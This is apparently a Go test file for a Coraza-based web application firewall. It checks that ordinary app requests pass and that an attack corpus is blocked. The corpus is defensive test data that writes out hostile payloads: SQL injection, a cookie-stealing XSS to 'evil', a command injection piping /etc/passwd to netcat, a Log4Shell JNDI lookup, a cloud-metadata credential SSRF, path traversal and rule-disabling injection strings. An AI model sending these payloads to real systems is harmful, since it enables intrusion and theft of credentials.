package firewall

import (
	"net/http"
	"runtime"
	"strconv"
	"strings"
	"testing"

	"aegis/internal/config"
)

// defaultOptions 与线上默认配置一致（config.NormalizeFirewallConfig 的默认值）。
func defaultOptions() Options {
	cfg := config.NormalizeFirewallConfig(config.FirewallConfig{CorazaEnabled: true})
	return Options{
		Paranoia:           cfg.CorazaParanoia,
		DetectionParanoia:  cfg.CorazaDetectionParanoia,
		InboundThreshold:   cfg.CorazaAnomalyThreshold,
		OutboundThreshold:  cfg.CorazaOutboundThreshold,
		ResponseBodyLimit:  cfg.CorazaResponseBodyLimit,
		RequestBodyLimit:   cfg.RequestBodyLimit,
		RequestBodyMemory:  cfg.RequestBodyMemory,
		ArgumentsLimit:     cfg.CorazaArgumentsLimit,
		RemovedRules:       cfg.CorazaRemovedRules,
		BodyExemptPrefixes: cfg.CorazaBodyExemptPrefixes,
		SensitiveArgs:      cfg.CorazaSensitiveArgs,
		RichTextArgs:       cfg.CorazaRichTextArgs,
		ExtraContentTypes:  cfg.CorazaExtraContentTypes,
	}
}

type corpusCase struct {
	name        string
	method      string
	uri         string
	contentType string
	body        string
	headers     map[string]string
	transport   string
	// posixOnly 依赖 t:normalizePath 的规则（930120 等）：Coraza 用 filepath.Clean 实现它，
	// Windows 上会把 /etc/passwd 变成 \etc\passwd 而永远匹配不上。线上是 Linux，CI 也是。
	posixOnly bool
}

func inspect(t *testing.T, w *WAF, c corpusCase) *Result {
	t.Helper()
	headers := http.Header{}
	headers.Set("User-Agent", "Mozilla/5.0 (Linux; Android 15; 25010PN30C) AppleWebKit/537.36 Chrome/131.0 Mobile Safari/537.36 AegisKotlin/1.0")
	headers.Set("Accept", "application/json")
	if c.contentType != "" {
		headers.Set("Content-Type", c.contentType)
	}
	for k, v := range c.headers {
		headers.Set(k, v)
	}
	method := c.method
	if method == "" {
		method = http.MethodGet
	}
	txn, res := w.Begin(Request{RemoteIP: "203.0.113.9", Method: method, URI: c.uri, Host: "aegis.example.com", Headers: headers, Transport: c.transport, ContentLength: int64(len(c.body))})
	defer txn.Close()
	if res != nil {
		return res
	}
	var body *strings.Reader
	if c.body != "" {
		body = strings.NewReader(c.body)
	}
	var out *Result
	var err error
	if body != nil {
		out, err = txn.RequestBody(body)
	} else {
		out, err = txn.RequestBody(nil)
	}
	if err != nil {
		t.Fatalf("%s: %v", c.name, err)
	}
	return out
}

func describe(r *Result) string {
	var parts []string
	for _, m := range r.Matches {
		parts = append(parts, strings.TrimSpace(strings.Join([]string{strconv.Itoa(m.RuleID), m.Severity, m.Message, strings.Join(m.Targets, ",")}, " ")))
	}
	return strings.Join(parts, "\n    ")
}

func TestDirectivesCompile(t *testing.T) {
	w, err := CompileWAF(defaultOptions())
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(w.Directives(), "Include @aegis/aegis-protection.conf") {
		t.Fatal("aegis protection rules not included")
	}
	if strings.Contains(w.Directives(), "ruleRemoveByTag=attack-sqli\n") {
		t.Fatal("blanket JSON exclusion must be gone")
	}
	cat := w.Catalog()
	if cat.TotalRules < 300 || cat.ActiveRules < 150 {
		t.Fatalf("catalog looks wrong: total=%d active=%d", cat.TotalRules, cat.ActiveRules)
	}
}

// 正常的 Aegis 业务请求：一条都不能拦（规则集 v2 去掉了「JSON 一律免检」，这组用例就是那条总开关的替代品）。
func TestBenignAegisTrafficPasses(t *testing.T) {
	w, err := CompileWAF(defaultOptions())
	if err != nil {
		t.Fatal(err)
	}
	cases := []corpusCase{
		{name: "password login", method: "POST", uri: "/api/v1/apps/voyage_main/auth/login/password", contentType: "application/json",
			body: `{"account":"zhang.san@example.com","password":"P@ss' OR w0rd--;<>","deviceId":"a1b2c3d4e5f6","captchaTicket":"t-123"}`},
		{name: "register with chinese nickname", method: "POST", uri: "/api/v1/apps/voyage_main/auth/register", contentType: "application/json",
			body: `{"account":"lisi_2026","password":"abc$123&def","nickname":"李四 · 远航","inviteCode":"VOY-8K2Q","email":"li.si+test@qq.com"}`},
		{name: "feedback with code snippet", method: "POST", uri: "/api/v1/apps/voyage_main/feedback", contentType: "application/json",
			body: `{"category":"bug","content":"播放器崩溃了，日志：\n` + "```" + `\nSELECT * FROM history WHERE id = 1; -- 我从数据库里看到的\n<script>console.log('x')</script>\nrm -rf cache/ && ./gradlew assemble\n` + "```" + `\n请尽快修复","contact":"qq 123456"}`},
		{name: "profile update", method: "PUT", uri: "/api/v1/apps/voyage_main/user/profile", contentType: "application/json",
			body: `{"nickname":"Tom & Jerry","signature":"Life is short; use Go :) 100% 真实","gender":1,"birthday":"1999-09-09","region":"广东 深圳"}`},
		{name: "search with operators", uri: "/api/v1/apps/voyage_main/search?q=%E5%A4%A9%E6%B0%94+and+or+not&page=1&limit=20&sort=-created_at"},
		{name: "monitor keys", uri: "/api/system/monitor/history?keys=postgres,redis,time,location,http_api,monitor,docs,cors,firewall"},
		{name: "admin rich body is not inspected", method: "POST", uri: "/api/admin/system/risk/rules", contentType: "application/json",
			body: `{"expression":"F.ip_accounts_1h >= 3 && event.props.path matches '^/api/(auth|user)/' || sleep(5)","note":"union select 1"}`},
		{name: "ai relay body exempt", method: "POST", uri: "/api/ai/v1/chat/completions", contentType: "application/json",
			body: `{"messages":[{"role":"user","content":"cat /etc/passwd; curl http://169.254.169.254/latest/ | sh"}]}`},
		{name: "sealed decrypted query", uri: "/api/v1/apps/voyage_main/points/history?page=2&type=sign", transport: "sealed"},
		{name: "storage file with restricted extension", uri: "/api/v1/apps/voyage_main/storage/objects/backup.db"},
		{name: "octet-stream upload", method: "PUT", uri: "/api/storage/upload/chunk", contentType: "application/octet-stream", body: "\x00\x01\x02binarydata"},
		{name: "multipart avatar", method: "POST", uri: "/api/v1/apps/voyage_main/user/avatar", contentType: "multipart/form-data; boundary=XyZ",
			body: "--XyZ\r\nContent-Disposition: form-data; name=\"file\"; filename=\"me.png\"\r\nContent-Type: image/png\r\n\r\n\x89PNG....\r\n--XyZ--\r\n"},
		{name: "oauth callback", uri: "/api/v1/apps/voyage_main/auth/oauth/callback?code=4%2F0AQlEd8x&state=eyJhcHAiOiJ2b3lhZ2UifQ&scope=openid+email"},
		{name: "passkey assertion", method: "POST", uri: "/api/v1/apps/voyage_main/auth/passkey/finish", contentType: "application/json",
			body: `{"id":"AbC-dEf_123","response":{"clientDataJSON":"eyJ0eXBlIjoid2ViYXV0aG4uZ2V0In0","authenticatorData":"SZYN5YgOjGh0NBcPZHZgW4_krrmihjLHmVzzuoMdl2MFAAAAAQ","signature":"MEUCIQD-x_y"}}`},
		{name: "markdown notice", method: "POST", uri: "/api/v1/apps/voyage_main/tickets/12/replies", contentType: "application/json",
			body: `{"content":"# 标题\n<img src=x onerror=alert(1)> 这是我复制的报错\n` + "`" + `$(whoami)` + "`" + `"}`},
		{name: "payment callback", method: "POST", uri: "/api/public/pay/callback/alipay", contentType: "application/x-www-form-urlencoded",
			body: "sign=abc%2B%2F%3D%3D&subject=%3Cscript%3E&notify_id=1"},
	}
	for _, c := range cases {
		res := inspect(t, w, c)
		if res.WouldBlock {
			t.Errorf("benign %q blocked (score %d, rule %d):\n    %s", c.name, res.InboundScore, res.RuleID, describe(res))
		}
	}
}

// 真实攻击：必须拦下（加密载荷解开后同样要拦）。
func TestAttacksAreBlocked(t *testing.T) {
	w, err := CompileWAF(defaultOptions())
	if err != nil {
		t.Fatal(err)
	}
	cases := []corpusCase{
		{name: "sqli in json", method: "POST", uri: "/api/v1/apps/voyage_main/user/profile", contentType: "application/json",
			body: `{"nickname":"x' UNION SELECT username,password FROM users--"}`},
		{name: "sqli in sealed query", uri: "/api/v1/apps/voyage_main/points/history?page=1%27%20or%201%3D1--%20", transport: "sealed"},
		{name: "xss in json", method: "POST", uri: "/api/v1/apps/voyage_main/user/profile", contentType: "application/json",
			body: `{"nickname":"<script>document.location='http://evil/?c='+document.cookie</script>"}`},
		{name: "rce in query", uri: "/api/v1/apps/voyage_main/search?q=%3Bcat%20%2Fetc%2Fpasswd%20%7C%20nc%20evil%204444", posixOnly: true},
		{name: "lfi", uri: "/api/v1/apps/voyage_main/files?path=..%2F..%2F..%2F..%2Fetc%2Fpasswd"},
		{name: "log4shell in header", uri: "/api/v1/apps/voyage_main/config", headers: map[string]string{"X-Api-Version": "${jndi:ldap://evil.com/a}"}},
		{name: "aliyun metadata ssrf", method: "POST", uri: "/api/v1/apps/voyage_main/user/avatar/url", contentType: "application/json",
			body: `{"url":"http://100.100.100.200/latest/meta-data/ram/security-credentials/"}`},
		{name: "internal risk token header", uri: "/api/admin/system/risk/status", headers: map[string]string{"X-Risk-Token": "guess"}},
		{name: "jwt alg none", uri: "/api/v1/apps/voyage_main/user/profile",
			headers: map[string]string{"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1aWQiOjF9."}},
		{name: "prototype pollution", method: "POST", uri: "/api/v1/apps/voyage_main/user/settings", contentType: "application/json",
			body: `{"__proto__":{"isAdmin":true},"theme":"dark"}`},
		{name: "sqli in rich text keeps lfi", method: "POST", uri: "/api/v1/apps/voyage_main/feedback", contentType: "application/json",
			body: `{"content":"see ../../../../etc/passwd and ../../../../etc/shadow","contact":"1' or '1'='1' -- "}`},
		{name: "invalid json body", method: "POST", uri: "/api/v1/apps/voyage_main/user/profile", contentType: "application/json", body: `{"a":`},
		{name: "trace method", method: "TRACE", uri: "/api/v1/apps/voyage_main/config"},
		{name: "json disguised as text/plain", method: "POST", uri: "/api/v1/apps/voyage_main/user/profile", contentType: EffectiveContentType("text/plain", []byte(`{"nickname":"' union select password from users -- "}`)),
			body: `{"nickname":"' union select password from users -- "}`},
	}
	for _, c := range cases {
		if c.posixOnly && runtime.GOOS == "windows" {
			continue
		}
		res := inspect(t, w, c)
		if !res.WouldBlock {
			t.Errorf("attack %q passed (score %d):\n    %s", c.name, res.InboundScore, describe(res))
		}
	}
}

func TestSensitiveArgumentsAreMasked(t *testing.T) {
	opts := defaultOptions()
	opts.SensitiveArgs = []string{"nickname"}
	w, err := CompileWAF(opts)
	if err != nil {
		t.Fatal(err)
	}
	res := inspect(t, w, corpusCase{name: "masked", method: "POST", uri: "/api/v1/apps/a/user/profile", contentType: "application/json",
		body: `{"nickname":"<script>alert(1)</script>","bio":"<script>alert(2)</script>"}`})
	for _, m := range res.Matches {
		if strings.Contains(m.Data, "alert(1)") {
			t.Fatalf("sensitive arg leaked into match data: %+v", m)
		}
	}
	if !res.WouldBlock {
		t.Fatalf("bio xss should still block: %s", describe(res))
	}
}

func TestDetectionOnlyReportsWouldBlock(t *testing.T) {
	opts := defaultOptions()
	opts.DetectionOnly = true
	w, err := CompileWAF(opts)
	if err != nil {
		t.Fatal(err)
	}
	res := inspect(t, w, corpusCase{name: "observe", uri: "/api/v1/apps/a/search?q=1%27%20union%20select%20password%20from%20users--"})
	if res.Interrupted {
		t.Fatal("detection only must not interrupt")
	}
	if !res.WouldBlock || res.InboundScore < 5 {
		t.Fatalf("expected would-block with score, got %+v\n    %s", res, describe(res))
	}
}

func TestExclusionsCompileAndApply(t *testing.T) {
	opts := defaultOptions()
	opts.Exclusions = []Exclusion{
		{Name: "cms body", PathMatch: "prefix", Path: "/api/v1/apps/voyage_main/cms/", Tags: []string{"attack-xss"}, Targets: []string{"ARGS:json.html"}},
		{Name: "probe", PathMatch: "exact", Path: "/api/v1/apps/voyage_main/probe", Methods: []string{"GET"}, RuleIDs: []int{930120, 930100, 930110, 932160, 932161}},
		{Name: "regex", PathMatch: "regex", Path: `^/api/v1/apps/[^/]+/notes/\d+$`, Tags: []string{"attack-sqli"}, Targets: []string{`ARGS:/^json\.blocks\./`}},
	}
	for _, e := range opts.Exclusions {
		if err := ValidateExclusion(e); err != nil {
			t.Fatalf("%s: %v", e.Name, err)
		}
	}
	w, err := CompileWAF(opts)
	if err != nil {
		t.Fatalf("%v\n%s", err, buildDirectives(opts.normalized()))
	}
	res := inspect(t, w, corpusCase{name: "excluded html", method: "POST", uri: "/api/v1/apps/voyage_main/cms/pages", contentType: "application/json",
		body: `{"html":"<div onmouseover=alert(1)><script>alert(1)</script></div>"}`})
	if res.WouldBlock {
		t.Fatalf("exclusion not applied: %s", describe(res))
	}
	res = inspect(t, w, corpusCase{name: "same path other field", method: "POST", uri: "/api/v1/apps/voyage_main/cms/pages", contentType: "application/json",
		body: `{"title":"<script>alert(document.cookie)</script>"}`})
	if !res.WouldBlock {
		t.Fatalf("exclusion must be target-scoped: %s", describe(res))
	}
}

func TestValidateExclusionRejectsInjection(t *testing.T) {
	bad := []Exclusion{
		{PathMatch: "prefix", Path: `/a" "id:1,phase:1,deny`, RuleIDs: []int{1}},
		{PathMatch: "prefix", Path: "/a", Tags: []string{"x,ctl:ruleEngine=Off"}},
		{PathMatch: "prefix", Path: "/a", RuleIDs: []int{941100}, Targets: []string{"ARGS:a,ctl:ruleEngine=Off"}},
		{PathMatch: "glob", Path: "/a", RuleIDs: []int{1}},
		{PathMatch: "prefix", Path: "/a"},
	}
	for i, e := range bad {
		if ValidateExclusion(e) == nil {
			t.Errorf("case %d should be rejected: %+v", i, e)
		}
	}
}
